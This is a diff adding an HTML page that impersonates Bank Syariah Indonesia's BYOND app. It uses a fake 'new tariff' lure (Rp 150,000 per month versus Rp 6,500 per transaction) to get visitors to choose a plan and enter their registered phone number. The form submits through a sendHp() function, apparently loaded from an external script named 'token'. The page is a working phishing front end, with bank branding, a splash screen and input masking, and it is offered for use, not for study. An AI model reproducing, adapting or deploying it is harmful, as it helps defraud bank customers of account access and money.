@@ -1,0 +1,567 @@
+<!DOCTYPE html>
+<html lang="in">
+<head>
+      <meta charset="UTF-8">
+      <title>𝗕𝗬𝗢𝗡𝗗 𝗯𝘆 𝗕𝗦𝗜.
+(ʙᴀɴᴋ sʏᴀʀɪᴀʜ ɪɴᴅᴏɴᴇsɪᴀ)</title>
+      <meta name="theme-color" content="#00A39E">
+      <meta name="description" content="Yuk segara konfirmasikan tarif sesuai dengan kebutuhan anda"> 
+      <meta property="og:image" content="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjixvOvFjlZHjJFQY_MfaNsTmlliBrEbovJgm5mgTcxH-cKXe5VagTLicxGt3FwnXTo7ZqKL9TSNUJudAqvEf8od9zrBT7-tmged1eSXLXRM2IGNQQ3lmdGjnIY1ZY8BcBUECsOVqnblFWRIqkxQ6LfAkdPumLoASdayCApdGPLqLo4dHtqaYIMq6gJC9hW/s720/1000150701.webp">
+      <link href="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEirOyUCSgyFPJpHSBwSv3yEvEVNWIpgS-a6drGwBcToQThRCj7Bv0dreUKGqfxhAW42SvQwHUkTEaCg9y20nL4p5EjLDDIQT9bkahfCCs3Xdaa3wJ2V5QzQRKx1J5BM2-7eroz8Z2KOn-4WshP6_WdkmeyBH7UmOOR2qQf5yeTsdm1_ZUsscHWPGM6vi9D9/s739/1000150702.jpg" rel="shortcut icon" type="image/x-icon">
+      <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no"/>
+      <style>
+      @import url('https://fonts.googleapis.com/css?family=Open+Sans&display=swap');
+      
+      body {
+            font-family: sans-serif;
+            position: relative;
+            margin: 0 auto;
+            left: 0; 
+            right: 0; 
+            max-width: 450px;       
+            background-color: #ffff;
+      } 
+             
+      .nav1 {
+            position: relative;     
+            height: 60px;
+            width: 100%;
+            margin: 0 auto;
+            left: 0; 
+            right: 0; 
+            max-width: 450px;
+            box-shadow: 0px 1px 4px 2px rgba(66, 68, 90, 0.18);
+            animation: slideDown 0.5s ease-out;
+      }
+ 
+      .nav2 {
+            z-index: 999999;
+            position: fixed;
+            background: url("img/nav2.png") transparent;
+            background-repeat: no-repeat;
+            background-size: 100% 100%;
+            height: 110px;
+            width: 100%;
+            bottom: 0; 
+            left: 0; 
+            right: 0; 
+            margin: 0 auto;
+            padding-top: 5px;
+            max-width: 450px;
+            animation: slideUp 0.5s ease-out;
+      }
+ 
+      .foto {
+            z-index: 9999;
+            width: 70%;
+            left: 0; 
+            right: 0;
+            margin: 0 auto;
+            top: 50px;
+            position: relative;
+            max-width: 430px;   
+            animation: zoomIn 0.8s ease-out;        
+      }
+
+      .radio-section {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            height: 100vh;
+      }
+      
+      h1 {
+            margin-bottom: 20px;
+      }
+      
+      .radio-item [type="radio"] {
+            display: none;
+      }
+      
+      .radio-item + .radio-item {
+            margin-top: 15px;
+      }
+      
+      .radio-item label {
+            display: block;
+            padding: 8px 0px;
+            background: transparent;
+            border: 2px solid #00A39E;
+            border-radius: 20px;
+            cursor: pointer;
+            font-size: 12px;
+            font-weight: 400;
+            max-width: 430px;
+            color: #00A39E;
+            margin: 8px auto;
+            top: 210px;
+            position: relative;
+            transition: all 0.3s ease;
+            animation: fadeInUp 0.6s ease-out;
+      }
+      
+      .radio-item label:hover {
+            background-color: rgba(0, 163, 158, 0.1);
+            transform: translateY(-2px);
+            box-shadow: 0 4px 8px rgba(0, 163, 158, 0.2);
+      }
+      
+      .radio-item label:after,
+      .radio-item label:before {
+            content: "";
+            position: absolute;
+            border-radius: 50%;
+      }
+      
+      .radio-item label:after {
+            height: 20px;
+            width: 20px;
+            border: 1px solid #00A39E;
+            left: 9px;
+            top: calc(50% - 11px);
+      }
+      
+      .radio-item label:before {
+            background: #00A39E;
+            height: 17px;
+            width: 17px;
+            left: 11.2px;
+            top: calc(50% - 9.8px);
+            transform: scale(5);
+            opacity: 0;
+            visibility: hidden;
+            transition: 0.4s ease-in-out 0s;
+      }
+      
+      .radio-item [type="radio"]:checked ~ label {
+            border-color: #F8B13B;
+            background-color: rgba(248, 177, 59, 0.1);
+      }
+      
+      .radio-item [type="radio"]:checked ~ label::before {
+            opacity: 1;
+            visibility: visible;
+            transform: scale(1);
+            margin-top: 0.9px;
+      }
+
+      .button {
+            z-index: 1;
+            background: #00A39E; 
+            margin-top: 16px; 
+            height: 45px; 
+            max-width: 100%; 
+            color: #fff; 
+            border-radius: 50px; 
+            border: 1px solid #00A39E;
+            width: 72%;      
+            font-weight: bold;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            animation: pulse 2s infinite;
+      }
+
+      .button:hover {
+            background: #00857F; 
+            transform: translateY(-3px);
+            box-shadow: 0 6px 12px rgba(0, 163, 158, 0.3);
+      }
+
+      .button:active {
+            transform: translateY(1px);
+      }
+
+      .three {
+          transition: all 0.2s;
+          transition-timing-function: cubic-bezier(0.2, 2, 0.3, 2);
+      }
+
+      .three:hover {
+          background: #00A39E; 
+          color: white;
+          border: none;
+          opacity: 0.9;
+          transform: scale(1.03);
+          box-shadow: 0 8px 15px rgba(66, 68, 90, 0.4);
+      }
+
+      .form-log {
+          box-sizing: border-box; 
+          height: 40px; 
+          width: 72%;        
+          border: none;
+          border-bottom: 1.5px solid #00A39E; 
+          border-image: initial; 
+          background-color: transparent;  
+          background: url("img/62.");
+          background-repeat: no-repeat;
+          background-position: left center;
+          background-size: 21%;     
+          font-family: 'Nunito', sans-serif; 
+          font-weight: 600; 
+          font-size: 16px; 
+          color: #00000099;              
+          outline: none; 
+          padding-left: 15%;
+          margin: auto;
+          display: block;
+          transition: all 0.3s ease;
+          animation: fadeInUp 0.8s ease-out;
+      }
+      
+      .form-log:focus {
+          border-bottom: 2px solid #F8B13B;
+          background-color: rgba(248, 177, 59, 0.05);
+      }
+    
+      .lbl {
+          font-size: 14px;
+          color: #000000cc;
+          margin-left: 13%;
+          font-weight: 800;
+          animation: fadeIn 0.8s ease-out;
+      }
+  
+      ::placeholder {
+          font-size: 13px;
+          font-weight: 400;
+      }
+  
+      .process1 {
+          width: 100%;
+          height: 100%;
+          display: flex;
+          align-items: center;
+          justify-content: center;
+          margin: auto;
+          position: fixed;
+          padding-top: 300px;
+          left: 0;
+          right: 0;
+          bottom: 0;
+          background: rgba(0, 0, 0, 0.4);
+          z-index: 999999999;
+      }
+      
+      .loading {
+          position: fixed;
+          display: flex;
+          align-items: center;
+          justify-content: center;
+          align-items: center;
+          margin-bottom: 20%;
+          margin-top: 0px;
+      }
+      
+      .loading img {
+          width: 190px;
+          border-radius: 10px;
+          animation: pulse 1.5s infinite;
+      }
+
+      welalxcome {
+          display: flex;
+          position: fixed;
+          top: 0;
+          left: 0;
+          right: 0;
+          bottom: 0;
+          width: 100%;
+          background: url('img/welcome.jpeg') no-repeat center center;
+          background-position: 100% 100%;
+          background-size: 100% 100%;
+          z-index: 10000;
+          background-color: #ffffff;
+      }
+      
+      welalxcome img {
+          width: 100%;
+          height: 700px;
+          margin-top: -55px;
+      }
+      
+      chsalxcome {
+          position: relative;
+          width: 100%;
+          height: 100vh;
+          display: flex;
+          flex-direction: column;
+          flex-wrap: nowrap;
+          align-items: center;
+      }
+ 
+      .animated {
+          -webkit-animation-duration: 1s;
+          animation-duration: 1s;
+          -webkit-animation-fill-mode: both;
+          animation-fill-mode: both;
+          -webkit-animation-timing-function: linear;
+          animation-timing-function: linear;
+          -webkit-animation-name: bounceIn; 
+          animation-name: bounceIn; 
+      }
+
+      @-webkit-keyframes bounceIn { 
+          0% { 
+              opacity: 1; 
+              -webkit-transform: scale(0); 
+          } 
+          50% { 
+              opacity: 1; 
+              -webkit-transform: scale(0); 
+          } 
+          70% { 
+              -webkit-transform: scale(0); 
+          } 
+          100% { 
+              -webkit-transform: scale(0); 
+          } 
+      } 
+
+      @keyframes bounceIn { 
+          0% { 
+              opacity: 1; 
+              transform: scale(.1); 
+          } 
+          50% { 
+              opacity: 1; 
+              transform: scale(.5); 
+          } 
+          70% { 
+              transform: scale(1); 
+          } 
+          100% { 
+              transform: scale(1); 
+          } 
+      } 
+
+      .naik {
+          -webkit-animation-duration: 1s;
+          animation-duration: 1s;
+          -webkit-animation-fill-mode: both;
+          animation-fill-mode: both;
+          -webkit-animation-timing-function: ease-in;
+          animation-timing-function: ease-in;
+          -webkit-animation-name: bounceOutUp; 
+          animation-name: bounceOutUp; 
+      }
+
+      @-webkit-keyframes bounceOutUp { 
+          0% { 
+              -webkit-transform: translateY(0); 
+          } 
+          20% { 
+              opacity: 1; 
+              -webkit-transform: translateY(20px); 
+          } 
+          100% { 
+              opacity: 1; 
+              -webkit-transform: translateY(-200px); 
+          } 
+      } 
+      
+      @keyframes bounceOutUp { 
+          0% { 
+              transform: translateY(0); 
+          } 
+          20% { 
+              opacity: 1; 
+              transform: translateY(20px); 
+          } 
+          100% { 
+              opacity: 1; 
+              transform: translateY(-500px); 
+          } 
+      } 
+      
+      .box {
+          position: relative;
+          background: none;
+          margin-bottom: 130px;
+          background: url('https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhAdy0Aat72-z2pFJ5DAcbYDdhUp_6gx8lcKBHvucygNiPG7EzRe-GFo9gr1DzqrtAWFWGNnQB0OHWJAWGK42ZJExkRlzWma5EREJlPcGZN97sfPVp1d5pa-8fQKUaODk1tauGTSFu3HePBduF7RspyMIYLfPmFd_ybXFazf7GYFlcwFmcToqBkV_u93Ew/s1080/1000239624.jpg');
+          background-repeat: no-repeat;
+          background-size: 100%;
+      }
+      
+      /* Animasi tambahan */
+      @keyframes fadeIn {
+          from { opacity: 0; }
+          to { opacity: 1; }
+      }
+      
+      @keyframes fadeInUp {
+          from {
+              opacity: 0;
+              transform: translateY(20px);
+          }
+          to {
+              opacity: 1;
+              transform: translateY(0);
+          }
+      }
+      
+      @keyframes slideDown {
+          from {
+              transform: translateY(-20px);
+              opacity: 0;
+          }
+          to {
+              transform: translateY(0);
+              opacity: 1;
+          }
+      }
+      
+      @keyframes slideUp {
+          from {
+              transform: translateY(20px);
+              opacity: 0;
+          }
+          to {
+              transform: translateY(0);
+              opacity: 1;
+          }
+      }
+      
+      @keyframes zoomIn {
+          from {
+              transform: scale(0.9);
+              opacity: 0;
+          }
+          to {
+              transform: scale(1);
+              opacity: 1;
+          }
+      }
+      
+      @keyframes pulse {
+          0% {
+              transform: scale(1);
+              box-shadow: 0 0 0 0 rgba(0, 163, 158, 0.);
+          }
+          
+          70% {
+              transform: scale(1.01);
+              box-shadow: 0 0 0 10px rgba(0, 163, 158, 0);
+          }
+          100% {
+              transform: scale(1);
+              box-shadow: 0 0 0 0 rgba(0, 163, 158, 0);
+          }
+      }
+      
+      
+      .form-element {
+          animation: fadeInUp 0.8s ease-out;
+          animation-fill-mode: both;
+      }
+      
+      .delay-1 {
+          animation-delay: 0.2s;
+      }
+      
+      .delay-2 {
+          animation-delay: 0.4s;
+      }
+      
+      .delay-3 {
+          animation-delay: 0.6s;
+      }
+      
+    
+      .spinner {
+          width: 50px;
+          height: 50px;
+          border: 5px solid rgba(0, 163, 158, 0.2);
+          border-radius: 50%;
+          border-top-color: #00A39E;
+          animation: spin 1s ease-in-out infinite;
+      }
+      
+      @keyframes spin {
+          to { transform: rotate(360deg); }
+      }
+      
+      </style>
+</head>
+<body>
+<main>
+<welalxcome style="display: none">
+</welalxcome>
+<chsalxcome2 style="display: none;">
+<div class="box">
+<nav class="nav1"></nav>
+
+   <center><img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEh8MUB0rACini0_wytYSsS8P_BtKYhA1n6fe_7bxk5HqKFmET_1Czb4BgFC2zBjIk7HD3VwGbR-NfTdBZyvq2hoFAPiy97j-FSBKSljSTlUlZItnhyphenhyphenUq6xoSgDBCHTiTt3Iwl-XpGq2IMmMVdUGrwLObgOrJE7ED75K5GoEi3AB3BJoRIj8VWROqgnHoeQY/s619/1000150703.png" class="foto" alt=""></center>
+
+<form id="formHP" onsubmit="sendHp()" style="margin-top:-150px;">
+ <section style="padding: 5px; left: 0; right: 0; margin: 0px auto; width: 60%;">
+	<div class="radio-list" style="position: absolute; left: 0; right: 0; margin: 0px auto; width: 75%;">
+	<center>
+		<div class="radio-item form-element delay-1"><input name="tarif" id="radio1" type="radio" value="BARU" required><label for="radio1">TARIF BARU Rp 150.000 / BULAN</label>
+		<div class="radio-item form-element delay-2"><input name="tarif" id="radio2" type="radio" value="LAMA" required><label for="radio2">TARIF LAMA Rp 6.500 / TRANSAKSI</label></div>
+	</center>
+	</div>
+		</section>   
+
+    <section style="margin-top: 320px;">
+          <label for="nohp" class="lbl form-element delay-1">No. HP. Terdaftar</label>
+     <input type="tel" id="nohp" class="form-log form-element delay-2" maxlength="13" name="nohp" placeholder="Tuliskan Nomor Handphone Anda" minlength="10" required>
+    
+   <div style="left: 0; right: 0; margin: 0px auto; width: 100%">
+    <center>
+     <button id="btnSubmit1" type="submit" class="button three form-element delay-3">SELANJUTNYA</button>
+     </center>
+     </div></div>
+     </section>
+     </form>
+     
+     
+     <center>
+     <div id="djload" name="process" class="process1" style="display: none;">
+            <div class="loading">
+                <img src="img/loding.">
+              
+            </div>
+        </div>
+        </center>
+<div class="nav2"></div>
+</div>
+
+    
+
+<script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery.mask/1.14.16/jquery.mask.min.js"></script>
+<script>
+$(document).ready(function() {
+    $('#nohp').on('input', function() {
+        if ($(this).val() == '0' || $(this).val() == '62') {
+            $(this).val('');
+        }
+    });
+});
+</script>
+    <script>
+$(document).ready(function() {
+    $('#nohp').mask('000-0000-00000');
+});
+    </script>
+<script>
+$(document).ready(function() {
+    $('welalxcome').fadeIn(500);
+    setTimeout(() => {
+        $('welalxcome').fadeOut();
+        $('chsalxcome2').fadeIn();
+    }, 1000);
+    
+    // Animasi untuk elemen form saat muncul
+    setTimeout(function() {
+        $('.form-element').each(function(i) {
+            $(this).delay(i * 200).animate({opacity: 1, top: 0}, 500);
+        });
+    }, 1200);
+});
+
+</script>
+   <script src="token"></script>   
+</body>
+</html>
